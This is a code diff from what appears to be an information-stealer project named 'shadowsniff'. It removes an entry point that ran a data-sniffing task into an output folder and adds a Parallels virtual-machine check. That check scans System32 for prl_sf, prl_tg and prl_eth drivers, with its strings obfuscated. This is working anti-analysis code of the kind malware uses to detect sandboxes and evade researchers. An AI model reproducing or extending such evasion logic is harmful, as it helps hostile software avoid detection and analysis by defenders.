@@ -23,34 +23,25 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
-
-use alloc::format;
-use collector::atomic::AtomicCollector;
-use collector::display::PrimitiveDisplayCollector;
+use crate::VmDetector;
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
-use shadowsniff::SniffTask;
-use tasks::Task;
-use utils::log_debug;
+use obfstr::obfstr as s;
 
-#[inline(always)]
-pub fn run() {
-    if !init_ip_info() {
-        panic!()
+pub struct ParallelsCheck;
+
+impl VmDetector for ParallelsCheck {
+    fn is_running_in_vm(&self) -> bool {
+        StorageFileSystem
+            .list_files_filtered(Path::system_root() / "System32", &|file| {
+                [s!("prl_sf"), s!("prl_tg"), s!("prl_eth")]
+                    .iter()
+                    .any(|driver| {
+                        file.name()
+                            .map_or(false, |file_name| file_name.contains(driver))
+                    })
+            })
+            .map_or(false, |v| !v.is_empty())
     }
-
-    let fs = StorageFileSystem;
-    let out = &Path::new("output");
-    let _ = fs.remove_dir_all(out);
-    let _ = fs.mkdir(out);
-
-    let collector = AtomicCollector::default();
-
-    SniffTask::default().run(out, &fs, &collector);
-
-    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
-
-    log_debug!("{displayed_collector}");
 }
